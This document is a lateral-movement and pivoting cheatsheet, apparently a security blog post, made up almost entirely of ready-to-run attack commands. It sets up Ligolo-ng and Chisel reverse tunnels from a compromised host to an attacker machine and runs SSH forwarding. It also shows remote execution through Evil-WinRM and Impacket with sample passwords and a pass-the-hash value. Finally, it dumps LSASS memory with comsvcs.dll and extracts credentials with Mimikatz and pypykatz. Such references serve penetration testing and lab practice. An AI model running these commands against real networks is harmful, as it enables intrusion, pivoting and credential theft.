---
title: "Lateral Movement & Pivoting Cheatsheet"
description: "Techniques for tunneling, pivoting through dual-homed networks, remote execution, and credential extraction."
pubDate: "2024-04-15"
category: "Cheatsheet"
tags: ["lateral-movement", "pivoting", "chisel", "ligolo", "ssh", "mimikatz"]
---

# Lateral Movement & Pivoting

## 1. Network Pivoting & Tunneling

### A. Ligolo-ng (Modern Tun-based Pivoting)
```bash
# On Attacker Machine (Proxy):
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On Compromised Host (Agent):
./agent.exe -connect 10.10.14.X:11601 -ignore-cert

# In Ligolo console on attacker:
session
# select active agent session
start

# Add routing to the internal subnet (e.g. 172.16.1.0/24)
sudo ip route add 172.16.1.0/24 dev ligolo
```

### B. Chisel (HTTP/WebSockets SOCKS5 Tunnel)
```bash
# On Attacker:
chisel server -p 8000 --reverse

# On Target:
chisel client 10.10.14.X:8000 R:socks

# Use proxychains with port 1080:
proxychains -q nmap -sT -Pn -p 80,445 172.16.1.50
```

### C. SSH Dynamic Port Forwarding & Remote Port Forwarding
```bash
# Dynamic SOCKS proxy on port 1080:
ssh -D 1080 -N -f user@10.10.10.100

# Local Port Forward (Access target 127.0.0.1:8080 locally on port 9090):
ssh -L 9090:127.0.0.1:8080 user@10.10.10.100

# Remote Reverse Port Forward (Send attacker port 80 to target):
ssh -R 8080:127.0.0.1:80 user@10.10.10.100
```

## 2. Remote Command Execution (RCE)

### A. Evil-WinRM (PowerShell Remoting over WinRM)
```bash
evil-winrm -i 10.10.10.100 -u 'Administrator' -p 'Password123!'
evil-winrm -i 10.10.10.100 -u 'Administrator' -H 'fc525c9680e4760202ff6109f1c019e4'
```

### B. Impacket Execution Tools
```bash
# PsExec (Creates service)
impacket-psexec domain.local/admin:pass@10.10.10.100

# WmiExec (Stealthy WMI execution)
impacket-wmiexec domain.local/admin:pass@10.10.10.100

# SmbExec (SMB named pipes)
impacket-smbexec domain.local/admin:pass@10.10.10.100
```

## 3. Credential Dumping & In-Memory Extraction
```powershell
# Dump LSASS Process using Comsvcs.dll (Living off the Land)
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full

# Parse with Pypykatz on attacker machine:
pypykatz lsa minidump lsass.dmp

# Extract credentials with Mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```
